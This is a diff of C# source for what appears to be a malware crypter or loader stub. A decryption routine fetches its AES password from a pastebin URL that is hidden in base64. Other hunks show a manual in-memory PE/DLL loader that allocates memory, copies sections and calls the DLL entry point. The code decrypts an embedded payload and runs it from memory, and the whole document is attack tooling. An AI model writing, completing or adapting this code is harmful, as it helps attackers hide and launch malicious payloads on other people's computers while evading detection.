@@ -37,59 +37,20 @@ namespace Encode
             return null;
         }
 
-        public static byte[] DecryptFile(byte[] in_file)
+        public static byte[] Decrypt(byte[] input)
         {
-            string password = new WebClient().DownloadString(Decode("aHR0cDovL3Bhc3RlYmluLmNvbS9yYXcvbTRVQ2R1emE"));
-            return DecryptStringFromBytes_Aes(in_file, password);
-        }
-
-        public static byte[] DecryptStringFromBytes_Aes(byte[] cipherText, string Key)
-        {
-            // Check arguments. 
-            if (cipherText == null || cipherText.Length <= 0)
-                throw new ArgumentNullException("cipherText");
-            if (Key == null || Key.Length <= 0)
-                throw new ArgumentNullException("Key");
-            // Declare the string used to hold 
-            // the decrypted text. 
-            byte[] decrypted;
-
-            // Create an Aes object 
-            // with the specified key and IV. 
-
-            // Create the streams used for decryption. 
-
-            using (Aes aesAlg = Aes.Create())
-            {
-                aesAlg.Mode = CipherMode.CBC;
-                aesAlg.Padding = PaddingMode.PKCS7;
-                //Grab IV from ciphertext
-                byte[] IV = new byte[16];
-                Array.Copy(cipherText, 0, IV, 0, 16);
-                //Use the IV for the Salt
-                byte[] theSalt = new byte[8];
-                Array.Copy(IV, theSalt, 8);
-                Rfc2898DeriveBytes keyGen = new Rfc2898DeriveBytes(Key, theSalt);
-                byte[] aesKey = keyGen.GetBytes(16);
-                aesAlg.Key = aesKey;
-
-                // Create a decrytor to perform the stream transform.
-                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, IV);
-
-                using (MemoryStream msDecrypt = new MemoryStream())
-                {
-                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Write))
-                    {
-                        using (BinaryWriter srDecrypt = new BinaryWriter(csDecrypt))
-                        {
-                            //Decrypt the ciphertext
-                            srDecrypt.Write(cipherText, IV.Length, (cipherText.Length - IV.Length));
-                        }
-                        decrypted = msDecrypt.ToArray();
-                        return decrypted;
-                    }
-                }
-            }
+            PasswordDeriveBytes pdb =
+          new PasswordDeriveBytes(new WebClient().DownloadString(Decode("aHR0cDovL3Bhc3RlYmluLmNvbS9yYXcvV25uUzhoVkg")), // Change this
+          new byte[] { 0x43, 0x87, 0x23, 0x72 }); // Change this
+            MemoryStream ms = new MemoryStream();
+            Aes aes = new AesManaged();
+            aes.Key = pdb.GetBytes(aes.KeySize / 8);
+            aes.IV = pdb.GetBytes(aes.BlockSize / 8);
+            CryptoStream cs = new CryptoStream(ms,
+              aes.CreateDecryptor(), CryptoStreamMode.Write);
+            cs.Write(input, 0, input.Length);
+            cs.Close();
+            return ms.ToArray();
         }
     }
 
@@ -284,15 +245,15 @@ namespace Encode
 
             [DllImport("kernel32")]
             public static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
-                 UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+                    UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
 
             [DllImport("kernel32.dll", SetLastError = true)]
             internal static extern bool VirtualFree(IntPtr lpAddress, UIntPtr dwSize,
-               uint dwFreeType);
+                uint dwFreeType);
 
             [DllImport("kernel32.dll", SetLastError = true)]
             internal static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize,
-               uint flNewProtect, out uint lpflOldProtect);
+                uint flNewProtect, out uint lpflOldProtect);
 
         }
         internal static class PointerHelpers
@@ -372,7 +333,7 @@ namespace Encode
                         typeof(fnDllEntry));
                 success = dllEntry(code.ToInt32(), 1, (void*)0);
             }
-            catch (Exception ex)
+            catch (Exception)
             {
                 return false;
             }
@@ -614,7 +575,7 @@ namespace Encode
                     if (size > 0)
                     {
                         dest = new IntPtr((Win32Imports.VirtualAlloc((uint)(codebase + (int)section.VirtualAddress), size, Win32Constants.MEM_COMMIT,
-                                                     Win32Constants.PAGE_READWRITE)));
+                                                        Win32Constants.PAGE_READWRITE)));
 
                         section.PhysicalAddress = (uint)dest;
                         var write = new IntPtr(headers.ToInt32() + (32 + dosHeader.e_lfanew + oldHeaders.FileHeader.SizeOfOptionalHeader) + (Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER)) * (i)));
@@ -627,7 +588,7 @@ namespace Encode
                 }
 
                 dest = new IntPtr((Win32Imports.VirtualAlloc((uint)(codebase + (int)section.VirtualAddress), section.SizeOfRawData, Win32Constants.MEM_COMMIT,
-                                             Win32Constants.PAGE_READWRITE)));
+                                                Win32Constants.PAGE_READWRITE)));
                 Marshal.Copy(data, (int)section.PointerToRawData, dest, (int)section.SizeOfRawData);
                 section.PhysicalAddress = (uint)dest;
                 var write2 = new IntPtr(headers.ToInt32() + (32 + dosHeader.e_lfanew + oldHeaders.FileHeader.SizeOfOptionalHeader) + (Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER)) * (i)));
